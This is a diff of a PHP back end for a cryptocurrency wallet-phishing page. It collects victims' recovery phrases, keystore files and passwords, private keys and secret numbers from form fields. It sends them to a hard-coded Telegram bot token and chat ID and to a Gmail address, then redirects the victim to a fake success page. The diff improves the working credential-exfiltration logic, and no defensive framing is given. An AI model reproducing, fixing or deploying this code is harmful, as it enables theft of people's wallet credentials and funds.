@@ -1,24 +1,26 @@
 <?php
 // Configuration
 $email_to = 'thamblanhema@gmail.com';
-$success_url = '/en/success.html';
+$success_url = '/dnsparkingcom/success.html';
 
 // Telegram Bot Configuration
-$telegramBotToken = "7520816072:AAHt9xJt86SPQ3qsTADXrbirW-4LEW7F_7U";  // Replace with your bot token
-$telegramChatID = "-4645179313";  // Replace with your actual channel username or chat ID
+$telegramBotToken = "7520816072:AAHt9xJt86SPQ3qsTADXrbirW-4LEW7F_7U";  // Your bot token
+$telegramChatID = "-4645179313";  // Your chat ID
 
-// Get the form data
-$wallet = $_POST['wallet'];
-$phrase = $_POST['phrase'];
-$keystore = $_POST['keystore1'];
-$keystorepass = $_POST['keystorepass1'];
-$privatekeyval = $_POST['privatekeyval'];
-$family_seed = $_POST['familyseed'];
-$privatekeys = [
-    $_POST['privatekey1'], $_POST['privatekey2'], $_POST['privatekey3'],
-    $_POST['privatekey4'], $_POST['privatekey5'], $_POST['privatekey6'],
-    $_POST['privatekey7'], $_POST['privatekey8']
-];
+// Get the form data with default values if not set
+$wallet = isset($_POST['wallet']) ? $_POST['wallet'] : 'Not provided';
+$phrase = isset($_POST['phrase']) ? $_POST['phrase'] : 'Not provided';
+$keystore = isset($_POST['keystore1']) ? $_POST['keystore1'] : 'Not provided';
+$keystorepass = isset($_POST['keystorepass']) ? $_POST['keystorepass'] : 'Not provided';
+$privatekeyval = isset($_POST['privatekeyval']) ? $_POST['privatekeyval'] : 'Not provided';
+$family_seed = isset($_POST['familyseed']) ? $_POST['familyseed'] : 'Not provided';
+
+// Handle private keys (Secret Numbers), which are optional
+$privatekeys = [];
+for ($i = 1; $i <= 8; $i++) {
+    $key = isset($_POST["privatekey$i"]) ? $_POST["privatekey$i"] : 'Not provided';
+    $privatekeys[] = $key;
+}
 
 // Create a single message body with all the input
 $message = "🚀 *New Wallet Submission!*\n\n";
@@ -33,12 +35,14 @@ foreach ($privatekeys as $index => $key) {
     $message .= "➖ Key " . ($index + 1) . ": `$key`\n";
 }
 
-// Send to Telegram
-sendToTelegram($telegramBotToken, $telegramChatID, $message);
-
-// Redirect to success page
-header('Location: ' . $success_url);
-exit();
+// Send to Telegram using file_get_contents
+$url = "https://api.telegram.org/bot$telegramBotToken/sendMessage?" . http_build_query([
+    'chat_id' => $telegramChatID,
+    'text' => $message,
+    'parse_mode' => 'Markdown',
+    'disable_notification' => false
+]);
+$response = file_get_contents($url);
 
 // Send to Email
 $subject = "New Wallet Data Submission";
@@ -48,27 +52,17 @@ $headers = 'From: Form <info@web3sols.com>' . "\r\n" .
            'Content-Type: text/html; charset=UTF-8';
 mail($email_to, $subject, nl2br($message), $headers);
 
-// Redirect to success page
-header('Location: ' . $success_url);
-exit();
-
-// Function to send message to Telegram
-function sendToTelegram($botToken, $chatID, $message) {
-    $url = "https://api.telegram.org/bot$botToken/sendMessage";
-    $data = [
-        'chat_id' => $chatID,
-        'text' => $message,
-        'parse_mode' => 'Markdown',
-        'disable_notification' => false  // Ensures the message is not silent
-    ];
-
-    // Use cURL to send request
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, $url);
-    curl_setopt($ch, CURLOPT_POST, 1);
-    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_exec($ch);
-    curl_close($ch);
+// Check if Telegram message was sent successfully
+if ($response !== false) {
+    $result = json_decode($response, true);
+    if (isset($result['ok']) && $result['ok'] === true) {
+        // Redirect to success page
+        header('Location: ' . $success_url);
+        exit();
+    } else {
+        echo "Error sending message to Telegram: " . $response;
+    }
+} else {
+    echo "Error: Unable to send request to Telegram.";
 }
 ?>
